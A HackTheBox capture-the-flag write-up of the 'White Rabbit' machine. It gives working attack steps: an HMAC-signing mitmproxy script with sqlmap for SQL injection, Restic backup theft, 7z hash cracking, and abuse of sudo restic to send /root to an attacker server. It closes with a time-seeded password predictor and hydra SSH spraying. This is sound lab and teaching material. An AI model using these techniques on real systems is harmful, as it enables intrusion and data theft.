---
layout: page
title: "White Rabbit (HTB) – CTF Writeup"
date: 2025-11-10

author: "Kerburenthusiasm"

# Collections / taxonomy
categories:
  - CTF
  - HackTheBox
platform: "htb"

tags:
  - n8n
  - Restic
  - SQLi
  - sqlmap
  - Restic-Server
  - John
  - Reverse Engineering
  - Ghidra

excerpt: "Full walkthrough of the White Rabbit HackTheBox machine, covering n8n abuse, Restic backup misconfigurations, SQL injection, and privilege escalation."
---


# Machine Information
- **Difficulty:** Insane
- **OS:** Linux

# Walkthrough
## Reconnaissance
A simple Nmap scan reveals that there are three ports opened:
- 22
- 80
- 2222

## Web Application Enumeration
The main web application reveals the company is utilizing several tools:
- n8n (workflow automation)
- Gophish (phishing framework)
- Stalwart (mail server)

> At this point, we have added `whiterabbit.htb` to our `/etc/hosts` file.

### Sub-domain and directory enumeration
During ffuf scanning we discovered the status subdomain. Further directory fuzzing revealed http://status.whiterabbit.htb/status/temp/. Visiting the link, we further identified more subdomains:

| Subdomain                       | Application | Purpose                      |
| :------------------------------ | :---------- | :--------------------------- |
| `a668910b5514e.whiterabbit.htb` | Wiki.js     | Documentation/Knowledge base |
| `ddb09a8558c9.whiterabbit.htb`  | Gophish     | Phishing campaign management |

## Wiki.js
Within Wiki.js, we found an article titled **Automating Phishing Score Analysis Using Gophish and n8n Workflows** that displayed:
- A N8N workflow diagram
- The N8N workflow diagram but in JSON format

## N8N Workflow
### SQL Injection Vulnerabiltiy
Reviewing the exported workflow JSON reveals a SQL injection vulnerability in the `executeQuery` node:

``` json
{
  "parameters": {
    "operation": "executeQuery",
    "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
    "options": {}
  },
  "id": "5929bf85-d38b-4fdd-ae76-f0a61e2cef55",
  "name": "Get current phishing score",
  "type": "n8n-nodes-base.mySql",
  "typeVersion": 2.4,
  "credentials": {
    "mySql": {
      "id": "qEqs6Hx9HRmSTg5v",
      "name": "mariadb - phishing"
    }
  }
}
```

It can be seen that the `email` parameter is vulnerable.

### Authentication Bypass

Before SQL Injection can be abused, the workflow validates the webhook requests using an HMAC-SHA256 algorithm via the `x-gophish-signature`.

**Extraction of `x-gophish-signature`:**

``` json
{
  "parameters": {
    "jsCode": "const signatureHeader = $json.headers[\"x-gophish-signature\"];\nconst signature = signatureHeader.split('=')[1];\nreturn { json: { signature: signature, body: $json.body } };"
  },
  "id": "49aff93b-5d21-490d-a2af-95611d8f83d1",
  "name": "Extract signature"
}
```

**Validation of `x-gophish-signature`:**

```json
{
    "parameters": {
    "conditions": {
        "options": {
        "caseSensitive": true,
        "leftValue": "",
        "typeValidation": "strict"
        },
        "conditions": [
        {
            "id": "8e2c34bd-a337-41e1-94a4-af319a991680",
            "leftValue": "={{ $json.signature }}",
            "rightValue": "={{ $json.calculated_signature }}",
            "operator": {
            "type": "string",
            "operation": "equals",
            "name": "filter.operator.equals"
            }
        }
        ],
        "combinator": "and"
    },
    "options": {}
},
```

**Calculation of `x-gophish-signature`:**

```json
{
  "parameters": {
    "action": "hmac",
    "type": "SHA256",
    "value": "={{ JSON.stringify($json.body) }}",
    "dataPropertyName": "calculated_signature",
    "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
  },
  "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
  "name": "Calculate the signature"
}
```
The `secret` key, which we can assume is used to generate the signature, is exposed in the exported JSON.

## Automating SQL Injection

`sqlmap` can exploit the SQL injection, and since we need to attach the `x-gophish-signature` header, we’ll use `--proxy` option to intercept the requests.

### Setup
The following Python script can be utilize to append the signature header:

```python
import hmac
import hashlib
import json
from mitmproxy import http, ctx

class SignRequests:
    def __init__(self):
        self.secret = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
    
    def request(self, flow: http.HTTPFlow) -> None:
        """Intercept requests and add HMAC signature"""
        
        # Check if this is a POST request with JSON body
        if flow.request.method == "POST":
            try:
                # Get the request body
                body = flow.request.get_text()
                
                # Only process if body exists and looks like JSON
                if body and body.strip().startswith('{'):
                    # Calculate HMAC-SHA256
                    signature = hmac.new(
                        self.secret.encode(),
                        body.encode(),
                        hashlib.sha256
                    ).hexdigest()
                    
                    # Add the header
                    header_value = f"sha256={signature}"
                    flow.request.headers["x-gophish-signature"] = header_value
                    
            except Exception as e:
                ctx.log.error(f"[HMAC] Error processing request: {e}")

addons = [SignRequests()]
```

Afterwards, launch the proxy with `mitmproxy`:

``` bash
mitmproxy -s sqli_poc.py --listen-host 127.0.0.1 --listen-port 8080
```

### Performing the SQL Injection
With the proxy setup, we can utilize `sqlmap` to perform the attack for us:

``` bash
sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" --data '{"campaign_id":1,"email":"test@ex.com","message":"Clicked Link"}' -p email --proxy "http://127.0.0.1:8080" --batch --dump --level=5 --risk=3
```

### Results
SQLMap identified that the SQLi was vulnerable to:
- Boolean-based blind SQLi
- Error-based SQLi
- Time-based blind SQLi

| ID  | Date                | Command                                                                                      |
| :-- | :------------------ | :------------------------------------------------------------------------------------------- |
| 1   | 2024-08-30 10:44:01 | `uname -a`                                                                                   |
| 2   | 2024-08-30 11:58:05 | `restic init --repo rest:http://75951e6ff.whiterabbit.htb`                                   |
| 3   | 2024-08-30 11:58:36 | `echo &lt;masked_password&gt; > .restic_passwd`                                              |
| 4   | 2024-08-30 11:59:02 | `rm -rf .bash_history`                                                                       |
| 5   | 2024-08-30 11:59:47 | `#thatwasclose`                                                                              |
| 6   | 2024-08-30 14:40:42 | `cd /home/neo/ && /opt/neo-password-generator/neo-password-generator &#124; passwd`         |

It appears that system commands are stored on the database. The reason was mentioned in the wiki:
> We will use the database for other projects related to phishing as well. As soon we get to production state, we will separate the data

## Exfiltrating Restic
With the Restic repository and credentials gathered, we can start exfiltrating the backup from the Restic repository.
### Setup

Install the Restic CLI tool:

```bash
sudo apt-get install restic
```

Configure environment variables:

```bash
export RESTIC_REPOSITORY=rest:http://75951e6ff.whiterabbit.htb
export RESTIC_PASSWORD=<masked_password>
```
### Snapshot Enumeration

List available snapshots:

```bash
restic snapshots
```

**Output**

``` bash
repository 5b26a938 opened (version 2, compression level auto)
created new cache in /home/kali/.cache/restic
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
```

### File Enumeration & Extraction
The files can be listed in the snapshot by running:

``` bash
restic ls latest
```

**Output**

``` bash
snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40...
/dev/shm/bob/ssh/bob.7z
```
### Restore snapshot
The files can be restored on our local machine by running:

``` bash
restic restore 272cacd5 --target /tmp/restore
```
## 7z Archive Extraction (Bob's SSH Key)
The extracted `bob.7z` file is password-protected. We need to crack it to obtain the SSH private key.

Extract the hash:

```bash
7z2john bob.7z > bob7z.hash
```

Crack with John the Ripper:

```bash
john --format=7z --wordlist=/usr/share/wordlists/rockyou.txt bob7z.hash
```

Extract the archive:

```bash
7z x bob.7z
```

Afterwards, the extracted content contains the SSH private key for the user `bob` which can be used to authenticate to the SSH service on port 2222.

## Enumerating as `bob`
Running `sudo -l`, we observe that the user `bob` was able to run `restic` as `root`. There's a [gtfobins](https://gtfobins.github.io/gtfobins/restic/) page regarding the issue running `restic` as root.

### Setup
**On your attacker machine, create a backup directory:**

```bash
mkdir -p ~/restic-backups
cd ~/restic-backups
```

**Install and start the REST server:**

```bash
# If not installed, install rest-server
sudo apt-get install rest-server

# Or build from source: https://github.com/restic/rest-server

# Start the REST server listening on all interfaces
sudo /usr/local/bin/rest-server --listen 0.0.0.0:12345 --path /home/kali/htb/Linux/WhiteRabbit/restic_backup --no-auth
```

**In another terminal, initialize a restic repository on your server:**

```bash
export RESTIC_REPOSITORY=rest:http://127.0.0.1:12345/root_backup
export RESTIC_PASSWORD=password123

restic init
```

This creates a backup repository that will accept backups from the victim.

### Triggering Root Backup on Victim

**On the victim (as root via sudo):**

```bash
# Set environment variables pointing to our attacker's REST server
export RHOST="10.10.14.X"  # Your attacker IP
export RPORT="12345"
export LFILE="/root"
export NAME="root_backup"

# Trigger restic backup to our server
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```

**Expected output:**

```
enter password for repository: 
repository 10aa9565 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files

Files:           4 new,     0 changed,     0 unimified
Dirs:            3 new,     0 changed,     0 unimified
Added to the repository: 6.493 KiB (3.601 KiB stored)

processed 4 files, 3.865 KiB
```

### Enumerating Files
List the snapshots:

```bash
restic snapshots
```

**Output**

``` bash
repository 10aa9565 opened (version 2, compression level auto)
created new cache in /home/kali/.cache/restic
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------
76d1d0ba  2025-11-09 21:40:47  ebdce80611e9              /root
--------------------------------------------------------------
1 snapshots
```

Restore the root backup to a local directory:

```bash
restic restore 76d1d0ba --target /tmp/root_exfil
```

And the content of the `/root` directory can be observed:

``` shell
/root/morpheus           # Private SSH key
/root/morpheus.pub       # Public SSH key
```

## Enumerating as `morpheus`
Looking at the `/home` directory, we noticed a familar user `neo`. This name appeared as one of the commands found in the database by `sqlmap`:

``` bash
cd /home/neo/ && /opt/neo-password-generator/neo-password-generator \| passwd
```
Fortunately, `/opt/neo-password-generator/neo-password-generator` is world-readable. Running strings on the binary shows the generator uses the time to create the password (which I believe is a huge red flag already):

``` bash
strings /opt/neo-password-generator/neo-password-generator
<truncated>
gettimeofday
srand
rand
```

### Ghidra Decompilation
To confirm the hypothesis that time is used as a paramter for generating password, `Ghidra` is utilize to decompile the binary. After decompilation, two methods stand out:

**Main Method:**

``` c
undefined8 main(void)
{
  long in_FS_OFFSET;
  timeval local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
  generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

**Password Generation Method:**

``` c
void generate_password(uint param_1)
{
  int iVar1;
  long in_FS_OFFSET;
  int local_34;
  char local_28 [20];
  undefined1 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  srand(param_1);
  for (local_34 = 0; local_34 < 0x14; local_34 = local_34 + 1) {
    iVar1 = rand();
    local_28[local_34] =
         "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[iVar1 % 0x3e];
  }
  local_14 = 0;
  puts(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

**Simple Analysis**
The generator constructs its seed by combining local_28.tv_sec (seconds) and local_28.tv_usec (microseconds) from gettimeofday() into a millisecond-precision timestamp:

```
seed = local_28.tv_sec * 1000 + local_28.tv_usec / 1000
```

This seed is passed to generate_password, which calls srand() to initialize the pseudo-random number generator. The function then calls rand() 20 times to pick characters from the charset:

```
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
```

Those 20 characters are concatenated to produce the final 20-character password. The fundamental issue is using `srand()` with a time-based seed. Since `rand()` is deterministic, identical seeds always produce identical sequences of numbers.

### Generating Password Candidates
The `sqlmap` results indicate the command executed around 2024-08-30 14:40:42. Since we only have second-level precision and lack the milliseconds, we can create a script to generate all possible password combinations by iterating through all 1000 millisecond offsets within that second.

``` python
#!/usr/bin/env python3
import ctypes
from datetime import datetime, timezone

def generate_password(seed):
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    libc = ctypes.CDLL(None)
    libc.srand(ctypes.c_uint(seed & 0xffffffff))
    
    password = ""
    for _ in range(20):
        password += charset[libc.rand() % len(charset)]
    return password

timestamp_str = "2024-08-30 14:40:42"
dt = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
timestamp_seconds = int(dt.timestamp())

with open("pwdcand.lists", "w") as f:
    for ms_offset in range(1000):
        seed = timestamp_seconds * 1000 + ms_offset
        f.write(generate_password(seed) + "\n")
```

Afterwards, perform password spraying with `hydra`:

``` bash
hydra -l neo -P pwdcand.lists ssh://<victim_ip>
```

**Result:**

```
[22][ssh] host: 10.129.232.22   login: neo   password: <password>
```

## Privilege Escalation
Checking `neo`'s sudo permission indicate that we can elevate our privileges to `root`.

```bash
neo@whiterabbit:/home/morpheus$ sudo -l
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```
# Lesson Learnt
- N8N exported workflow leaks sensitive information.
- Utilzing Restic for enumeration and file exfiltration.
- Analyzing decompiled binaries to discover weak, time-based password generation schemes.